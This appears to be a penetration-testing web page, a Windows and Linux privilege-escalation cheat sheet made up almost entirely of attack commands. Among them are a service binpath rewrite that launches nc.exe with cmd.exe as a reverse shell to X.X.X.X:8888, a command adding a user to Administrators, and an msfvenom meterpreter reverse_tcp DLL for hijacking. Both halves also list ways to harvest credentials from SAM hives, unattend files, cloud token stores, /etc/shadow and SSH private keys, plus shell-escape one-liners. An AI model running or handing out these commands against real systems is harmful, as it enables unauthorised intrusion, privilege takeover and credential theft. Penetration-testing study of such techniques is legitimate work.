---
layout: page
title: "Privilege Escalation Master"
meta_title: "Privilege Escalation Master"
subheadline: "Find an Exploit"
teaser: "Here you will find a quick cheatsheet for Windows and Linux privilege escalation vulnerabilities within every type of vulnerability there's a link to a database of vulnerbilities, a tip or a link to a tool to quickly guide you to the right exploit."
header:
   image_fullwidth: "Red.jpg"
permalink: "/privesc-master"
---

{% include alert info='Windows' %}	

{% include alert warning='<h3>Kernel</h3><br>OS name and version:<br>
<code>>C:\Windows\system32> systeminfo | findstr /B /C:"OS Name" /C:"OS Version"</code><br>
Check drivers:<br><code>driverquery</code><br>Check Patches:<br>
<code>>wmic qfe get Caption,Description,HotFixID,InstalledOn</code><br>
Tools for enumeration:<br>
<a href="https://github.com/rasta-mouse/Sherlock">Sherlock</a><br>
<a href="https://github.com/rasta-mouse/Watson">Watson </a><br>
<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">Windows Exploit Suggester </a><br>
Got lucky ?<br><a href="https://hacking-resources.com/privesc-master/windows-kernel">Search Kernel Exploits Here</a>' %}


{% include alert warning='<h3>Services</h3><br>Enumeration:<br>
<code>sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\output.txt</code><br>

Modify a service binary:<br>
<code>>sc config [Service_Name] binpath= "C:\nc.exe -nv X.X.X.X 8888 -e C:\WINDOWS\System32\cmd.exe"<br><br>
<code>>sc config [Service_Name] binpath= "net localgroup administrators username /add"<br>
<code>>sc config [Service_Name] binpath= "C:\Documents and Settings\%username%\reverseshell.exe"</code><br>

Restart service:<br>
<code>>wmic service NAMEOFSERVICE call startservice</code><br>
<code>>net stop [service name] && net start [service name]</code><br>


' %}






{% include alert warning='<h3>Unquoted Service Path</h3><br>
If the path to an executable is not inside quotes, Windows will try to execute the service executable from inside each directory.
For example, for the path C:\Program Files\Some Folder\Service.exe Windows will try to execute:<br>
C:\reverseshell.exe<br>
C:\Program Files\reverseshell.exe <br>
C:\Program Files\Some Folder\reverseshell.exe<br><br>

enumeration command:<br>
<code>>wmic service get name,displayname,pathname,startmode 2>nul |findstr /i "Auto" 2>nul |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """</code><br>Check Permissions:<br>

<code>>icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"</code><br>
<code>>icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"</code><br>
<code>>icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"</code><br>
<code>>icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"</code><br>
Need some help?<br>
<a href="https://hacking-resources.com/privesc-master/windows-unquoted">List of applications that will possibly have this issue click here </a><br>' %}








{% include alert warning='<h3>DLL Hijacking</h3><br>
Windows has a search path for DLLs in its underlying architecture. If you can figure out what DLLs an executable requests without an absolute path (triggering this search process), you can then place your hostile DLL somewhere higher up the search path so it’ll be provided to the application before the real version.<br>
Search order:<br>
The directory from which the application loaded.<br>
The system directory. (C:\Windows\System32\)<br>
The 16-bit System Directory. (C:\Windows\System\)<br>
The Windows directory. (C:\Windows\)<br>
The current directory.<br>
The directories that are listed in the PATH environment variable.<br><br>


Enumeration:<br>
<code>>wmic process > outfile</code><br>
<code>>tasklist /FO CSV > tasks.txt</code><br><br>

Enumeration tools:<br><br>
<a href="https://github.com/MojtabaTajik/Robber">Robber</a><br>
Enumeration Tool<br><br>
<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">Autoruns</a><br>
Find startup programs and show the file path the program runs from.<br><br>
<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">Procmon</a><br>
Apply a basic filter with the following properties:<br>
Process Name is <[Value]><br>
Result is <[NAME NOT FOUND]><br>
Path ends with .dll* <br><br>

Powersploit tool to enumerate and exploit:<br>
<a href="https://powersploit.readthedocs.io/en/latest/Privesc/Find-ProcessDLLHijack/">Find-ProcessDLLHijack </a><br>
<a href="https://powersploit.readthedocs.io/en/latest/Privesc/Find-PathDLLHijack/">Find-PathDLLHijack </a><br>
<a href="https://powersploit.readthedocs.io/en/latest/Privesc/Write-HijackDll/">Write-HijackDll </a><br><br>

Now utilize the search order and check where is the original dll loaded from. in case it`s loaded from The windows directory then you can use the first 3 to inject your dll.<br>

Check Permissions:<br>
<code>>icacls .</code><br>

Generate the dll file<br>
<code>>msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=8888 -f dll > output.dll</code><br><br>

' %}









{% include alert warning='<h3>Disclosed Credentials</h3><br>

Search for files containing passwords:<br>
<code>>findstr /si password *.xml *.ini *.txt *.config 2>nul</code><br>
<code>>findstr /si pass *.txt | *.xml | *.ini</code><br>

Check unattended files:<br>
<code>C:\Windows\sysprep\sysprep.xml</code><br>
<code>C:\Windows\sysprep\sysprep.inf</code><br>
<code>C:\Windows\sysprep.inf</code><br>
<code>C:\Windows\Panther\Unattended.xml</code><br>
<code>C:\Windows\Panther\Unattend.xml</code><br>
<code>C:\Windows\Panther\Unattend\Unattend.xml</code><br>
<code>C:\Windows\Panther\Unattend\Unattended.xml</code><br>
<code>C:\Windows\System32\Sysprep\unattend.xml</code><br>
<code>C:\Windows\System32\Sysprep\unattended.xml</code><br>
<code>C:\unattend.txt</code><br>
<code>C:\unattend.inf</code><br>

Check SAM and SYSTEM files:<br>

<code>%SYSTEMROOT%\repair\SAM</code><br>
<code>%SYSTEMROOT%\System32\config\RegBack\SAM</code><br>
<code>%SYSTEMROOT%\System32\config\SAM</code><br>
<code>%SYSTEMROOT%\repair\system</code><br>
<code>%SYSTEMROOT%\System32\config\SYSTEM</code><br>
<code>%SYSTEMROOT%\System32\config\RegBack\system</code><br>
Cloud Credentials<br>
Check user home for below directories/files:<br>
<code>.aws\credentials</code><br>
<code>AppData\Roaming\gcloud\credentials.db</code><br>
<code>AppData\Roaming\gcloud\legacy_credentials</code><br>
<code>AppData\Roaming\gcloud\access_tokens.db</code><br>
<code>.azure\accessTokens.json</code><br>
<code>.azure\azureProfile.json</code><br>' %}




{% include alert warning='<h3>Other enumeration commands:</h3><br>

Info about current user:<br>
<code>>whoami</code><br>
<code>>echo %USERNAME%</code><br>
<code>>whoami /priv</code><br>
Other users:<br>
<code>>net users</code><br>
<code>>dir /b /ad "C:\Users\"</code><br>
Groups:<br>
<code>>net localgroup </code><br>
<code>>net localgroup Administrators </code><br>
<code>>whoami /all </code><br>

Network connections and the firewall rules:<br>
<code>>netstat -ano</code><br>
<code>>netsh firewall show state</code><br>
<code>>netsh firewall show config</code><br>

Checking AV:<br>
<code>>WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | more</code><br>
Check clipboard content:<br>
<code>>powershell -command "Get-Clipboard"</code><br>
Processes and services:<br>
<code>>tasklist /SVC</code><br>
<code>>tasklist /v</code><br>
<code>>net start</code><br>
<code>>sc query</code><br>
Installed Programs:<br>
<code>>dir /a "C:\Program Files"</code><br>
<code>>dir /a "C:\Program Files (x86)"</code><br>
<code>>reg query HKEY_LOCAL_MACHINE\SOFTWARE</code><br>

Run at Startup:<br>
<code>>wmic startup get caption,command</code><br>
<code>>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code><br>
<code>>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce</code><br>
<code>>reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code><br>
<code>>reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</code><br>
<code>>dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"</code><br>
<code>>dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"</code><br>

Scheduled tasks:<br>
<code>>schtasks /query /fo LIST 2>nul | findstr TaskName</code><br>
<code>>dir C:\windows\tasks</code><br>


' %}















{% include alert terminal='Linux' %}

{% include alert warning='<h3>Kernel</h3><br>
Check the OS / Architecture / Kernel version:<br>
<code>$uname -a</code><br>
<code>$uname -mrs</code><br>
<code>$cat /proc/version</code><br>
<code>$cat /etc/issue</code><br>
<code>$cat /etc/*-release</code><br>
<code>$cat /etc/lsb-release # Debian based</code><br>
<code>$cat /etc/redhat-release # Redhat based</code><br>
<code>$rpm -q kernel</code><br>
<code>$dmesg | grep Linux</code><br>
<code>$ls /boot | grep vmlinuz- </code><br><br>

Check Development Environment on Target Hosts:<br>
<code>$find / -name perl*</code><br>
<code>$find / -name python*</code><br>
<code>$find / -name gcc* </code><br>
<code>$find / -name cc</code><br>

use <code>searchsploit</code>to find an exploit<br>

<a href="https://hacking-resources.com/privesc-master/linux-kernel"> or search through hacking-resources here</a>
' %}






{% include alert warning='<h3>Services</h3><br>
Check running services:<br>
<code>$ps aux</code><br>
<code>$ps -ef</code><br>
<code>$top</code><br>
<code>$cat /etc/services</code><br>
<code>$netstat -antup</code><br>
Check what services is running as root using the following commands:<br>
<code>$ps aux | grep root</code><br>
<code>$ps -ef | grep root</code><br>

Check installed application and check if they`re running:<br>
<code>$ls -alh /usr/bin/</code><br>
<code>$ls -alh /sbin/</code><br>
<code>$dpkg -l</code><br>
<code>$rpm -qa</code><br>
<code>$ls -alh /var/cache/apt/archives</code><br>
<code>$ls -alh /var/cache/yum/</code><br><br>

Check services configuration:<br>
<code>$cat /etc/syslog.conf</code><br>
<code>$cat /etc/chttp.conf</code><br>
<code>$cat /etc/lighttpd.conf</code><br>
<code>$cat /etc/cups/cupsd.conf</code><br>
<code>$cat /etc/inetd.conf</code><br>
<code>$cat /etc/apache2/apache2.conf</code><br>
<code>$cat /etc/my.conf</code><br>
<code>$cat /etc/httpd/conf/httpd.conf</code><br>
<code>$cat /opt/lampp/etc/httpd.conf</code><br>
<code>$ls -aRl /etc/ | awk &apos;$1 ~ /^.*r.*/</code><br><br>

Then check if running services have public exploits use <code>$searchsploit</code> or google.<br>
If the service is running as root check what can you execute with the service. <br>
' %}





{% include alert warning='<h3>Suid and Guid Misconfiguration</h3><br>
When a binary with suid permission is run it is run as another user, and therefore with the
other users privileges. So we can try exploiting that behaviour.<br><br>
Enumeration:<br>
#Find SUID<br>
<code>$find / -perm -u=s -type f 2>/dev/null</code><br>
#Find GUID<br>
<code>$find / -perm -g=s -type f 2>/dev/null</code><br>
<code>$find / -perm -u=s -type f 2>/dev/null</code><br>
<code>$find / -perm -g=s -o -perm -u=s -type f 2>/dev/null</code><br>
<code>$find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null</code><br><br>
a good place to look for this type of exploits is<br>
<a href="https://gtfobins.github.io/">GTFOBins</a>
' %}



{% include alert warning='<h3>Disclosed Credentials</h3><br>
Enumeration:<br>
#Search history files<br>
<code>$cat ~/.bash_history</code><br>
<code>$cat ~/.nano_history</code><br>
<code>$cat ~/.atftp_history</code><br>
<code>$cat ~/.mysql_history</code><br>
<code>$cat ~/.php_history</code><br>
#Other files that may contain passwords<br>
<code>$cat /var/apache2/config.inc</code><br>
<code>$cat /var/lib/mysql/mysql/user.MYD</code><br>
<code>$cat /root/anaconda-ks.cfg</code><br>
<code>$cat /etc/syslog.conf</code><br>
<code>$cat /etc/chttp.conf</code><br>
<code>$cat /etc/lighttpd.conf</code><br>
<code>$cat /etc/cups/cupsd.conf</code><br>
<code>$cat /etc/inetd.conf</code><br>
<code>$cat /etc/apache2/apache2.conf</code><br>
<code>$cat /etc/my.conf</code><br>
<code>$cat /etc/httpd/conf/httpd.conf</code><br>
<code>$cat /opt/lampp/etc/httpd.conf</code><br>
<code>$ls -aRl /etc/ | awk &apos;$1 ~ /^.*r.*/</code><br>

#Finding SSH private keys<br>
<code>$cat ~/.ssh/authorized_keys</code><br>
<code>$cat ~/.ssh/identity.pub</code><br>
<code>$cat ~/.ssh/identity</code><br>
<code>$cat ~/.ssh/id_rsa.pub</code><br>
<code>$cat ~/.ssh/id_rsa</code><br>
<code>$cat ~/.ssh/id_dsa.pub</code><br>
<code>$cat ~/.ssh/id_dsa</code><br>
<code>$cat /etc/ssh/ssh_config</code><br>
<code>$cat /etc/ssh/sshd_config</code><br>
<code>$cat /etc/ssh/ssh_host_dsa_key.pub</code><br>
<code>$cat /etc/ssh/ssh_host_dsa_key</code><br>
<code>$cat /etc/ssh/ssh_host_rsa_key.pub</code><br>
<code>$cat /etc/ssh/ssh_host_rsa_key</code><br>
<code>$cat /etc/ssh/ssh_host_key.pub</code><br>
<code>$cat /etc/ssh/ssh_host_key</code><br>
#Locate files with user or pass<br>
<code>$grep -i user [filename]</code><br>
<code>$grep -i pass [filename]</code><br>

' %}




{% include alert warning='<h3>Cron Jobs</h3><br>
Enumeration:<br>
<code>$crontab -l</code><br>
<code>$ls -alh /var/spool/cron</code><br>
<code>$ls -al /etc/ | grep cron</code><br>
<code>$ls -al /etc/cron*</code><br>
<code>$cat /etc/cron*</code><br>
<code>$cat /etc/at.allow</code><br>
<code>$cat /etc/at.deny</code><br>
<code>$cat /etc/cron.allow</code><br>
<code>$cat /etc/cron.deny</code><br>
<code>$cat /etc/crontab</code><br>
<code>$cat /etc/anacrontab</code><br>
<code>$cat /var/spool/cron/crontabs/root</code><br>
To exploit this overwrite the cron file with misconfigured permissions or inject code in it.
' %}

{% include alert warning='<h3>$sudo</h3><br>
Enumeration:<br>
#List Sudoers
<code>$cat /etc/sudoers</code><br>
#Show which commands sudo allows you to run
<code>$sudo -l</code><br>
You can use <a href="https://gtfobins.github.io/">GTFOBins</a> here too.
' %}

{% include alert warning='<h3>Spawning a TTY Shell</h3><br>
<code>$python -c &apos;import pty; pty.spawn("/bin/sh")&apos;</code><br><br>
<code>$echo os.system(&apos;/bin/bash&apos;)</code><br>
<code>$/bin/sh -i</code><br><br>
<code>$perl -e &apos;exec "/bin/sh";&apos;</code><br>
perl: <code>$exec "/bin/sh";</code><br><br>
ruby: <code>$exec "/bin/sh"</code><br><br>
lua: <code>$os.execute(&apos;/bin/sh&apos;)</code><br><br>
From within IRB:<br>
<code>$exec "/bin/sh"</code><br>
From within vi:<br>
<code>:!bash</code><br>
From within vi:<br>
<code>:set shell=/bin/bash:shell</code><br>
From within nmap:<br>
<code>!sh</code><br>
' %}

{% include alert warning='<h3>Other Commands</h3><br>
#Check sensitive files
<code>$cat /etc/passwd</code><br>
<code>$cat /etc/group</code><br>
<code>$cat /etc/shadow</code><br>
<code>$ls -alh /var/mail/</code><br><br>

#Check user history
<code>$cat ~/.bash_history</code><br>
<code>$cat ~/.nano_history</code><br>
<code>$cat ~/.atftp_history</code><br>
<code>$cat ~/.mysql_history</code><br>
<code>$cat ~/.php_history</code><br><br>

#World writable files:

<code>$find / -writable -type d 2>/dev/null</code>      # world-writeable folders<br>
<code>$find / -perm -222 -type d 2>/dev/null</code>     # world-writeable folders<br>
<code>$find / -perm -o w -type d 2>/dev/null</code>     # world-writeable folders<br>
<code>$find / -perm -o x -type d 2>/dev/null</code>     # world-executable folders<br>
<code>$find / \( -perm -o w -perm -o x \) -type d 2>/dev/null</code>   # world-writeable & executable folders<br><br>

#Find a way to upload files:<br>
<code>$find / -name wget</code><br>
<code>$find / -name nc*</code><br>
<code>$find / -name netcat*</code><br>
<code>$find / -name tftp* </code><br>
<code>$find / -name ftp</code><br><br>
#List environment variables
<code>$cat /etc/profile</code><br>
<code>$cat /etc/bashrc</code><br>
<code>$cat ~/.bash_profile</code><br>
<code>$cat ~/.bashrc</code><br>
<code>$cat ~/.bash_logout</code><br>
<code>$env</code><br><br>

#Check log files:<br>

<code>$cat /etc/httpd/logs/access_log</code><br>
<code>$cat /etc/httpd/logs/access.log</code><br>
<code>$cat /etc/httpd/logs/error_log</code><br>
<code>$cat /etc/httpd/logs/error.log</code><br>
<code>$cat /var/log/apache2/access_log</code><br>
<code>$cat /var/log/apache2/access.log</code><br>
<code>$cat /var/log/apache2/error_log</code><br>
<code>$cat /var/log/apache2/error.log</code><br>
<code>$cat /var/log/apache/access_log</code><br>
<code>$cat /var/log/apache/access.log</code><br>
<code>$cat /var/log/auth.log</code><br>
<code>$cat /var/log/chttp.log</code><br>
<code>$cat /var/log/cups/error_log</code><br>
<code>$cat /var/log/dpkg.log</code><br>
<code>$cat /var/log/faillog</code><br>
<code>$cat /var/log/httpd/access_log</code><br>
<code>$cat /var/log/httpd/access.log</code><br>
<code>$cat /var/log/httpd/error_log</code><br>
<code>$cat /var/log/httpd/error.log</code><br>
<code>$cat /var/log/lastlog</code><br>
<code>$cat /var/log/lighttpd/access.log</code><br>
<code>$cat /var/log/lighttpd/error.log</code><br>
<code>$cat /var/log/lighttpd/lighttpd.access.log</code><br>
<code>$cat /var/log/lighttpd/lighttpd.error.log</code><br>
<code>$cat /var/log/messages</code><br>
<code>$cat /var/log/secure</code><br>
<code>$cat /var/log/syslog</code><br>
<code>$cat /var/log/wtmp</code><br>
<code>$cat /var/log/xferlog</code><br>
<code>$cat /var/log/yum.log</code><br>
<code>$cat /var/run/utmp</code><br>
<code>$cat /var/webmin/miniserv.log</code><br>
<code>$cat /var/www/logs/access_log</code><br>
<code>$cat /var/www/logs/access.log</code><br>
<code>$ls -alh /var/lib/dhcp3/</code><br>
<code>$ls -alh /var/log/postgresql/</code><br>
<code>$ls -alh /var/log/proftpd/</code><br>
<code>$ls -alh /var/log/samba/</code><br>

' %}


{% include alert warning='<h3>Enumeration Scripts</h3><br>
<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPEAS</a><br>
<a href="https://github.com/rebootuser/LinEnum">LinEnum</a><br>
<a href="http://pentestmonkey.net/tools/audit/unix-privesc-check">unix-privesc-check</a><br>
<a href="https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py">linprivchecker.py</a><br>
' %}
	
{% include share.html %}	
{% include chat.html %}
	
	
